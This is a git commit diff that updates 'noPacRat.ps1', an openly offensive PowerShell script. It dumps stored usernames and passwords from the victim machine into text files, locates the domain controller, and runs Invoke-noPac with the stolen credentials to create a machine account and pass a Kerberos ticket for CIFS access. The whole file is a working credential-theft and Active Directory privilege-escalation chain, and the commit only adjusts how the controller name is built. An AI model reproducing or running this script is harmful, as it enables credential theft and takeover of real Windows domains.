292ac44fc36fc0e22523c20137761e1e09b76158
assume-breach <76174163+assume-breach@users.noreply.github.com>
2022-03-20 18:10:34 -0400

    Update noPacRat.ps1

--- noPacRat/noPacRat.ps1
+++ noPacRat/noPacRat.ps1
@@ -4,11 +4,14 @@ import-module activedirectory
 .\dumpUserStore.ps1 > username.txt
 import-module .\dumpPassStore.ps1 
 .\dumpPassStore.ps1 > password.txt
-Get-ADDomainController -Discover -Site "Default-First-Site-Name" -ForceDiscover | select Name > DC.txt
+$DC = Get-ADDomainController -Discover -Site "Default-First-Site-Name" -ForceDiscover | select Name > DC.txt
 $DC = Get-Content .\DC.txt | select -Index 3
-$DC | Foreach {$_.TrimEnd()} | Set-Content DC.txt
+$DC |Foreach {$_.TrimEnd()} | Set-Content DC.txt
+$DC.TrimEnd() > .\DC.txt
+$DC = Get-Content .\DC.txt
+$DCvar = "$DC.$domain"
 $username = Get-Content .\username.txt -First 1
 $password = Get-Content .\password.txt -First 1
 $domain = (gwmi win32_computersystem).Domain
 import-module .\Invoke-noPac.ps1
-Invoke-noPac "-domain $domain -user $username -pass $password /enctype rc4 /dc $DC.$domain /mAccount newmachine /mPassword Password123 /service cifs /ptt"
+Invoke-noPac "-domain $domain -user $username -pass $password /enctype rc4 /dc $DCvar /mAccount newmachine /mPassword Password123 /service cifs /ptt"
